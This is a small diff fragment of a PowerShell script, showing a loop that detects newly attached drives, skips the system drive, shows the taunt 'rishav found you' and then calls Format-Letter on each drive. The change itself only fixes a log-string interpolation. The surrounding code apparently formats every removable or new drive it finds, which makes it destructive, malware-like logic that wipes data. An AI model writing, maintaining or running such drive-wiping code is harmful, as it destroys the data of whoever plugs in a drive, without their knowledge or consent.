@@ -70,7 +70,7 @@ while ($true) {
   foreach ($d in $current) {
     if ($seen.Contains($d)) { continue }
     [void]$seen.Add($d)
-    if ($d -eq $sysDrive) { Log "SKIP $d: system drive"; continue }
+    if ($d -eq $sysDrive) { Log "SKIP ${d}: system drive"; continue }
     Log "Detected $d"
     Shout 'rishav found you'
     Format-Letter $d
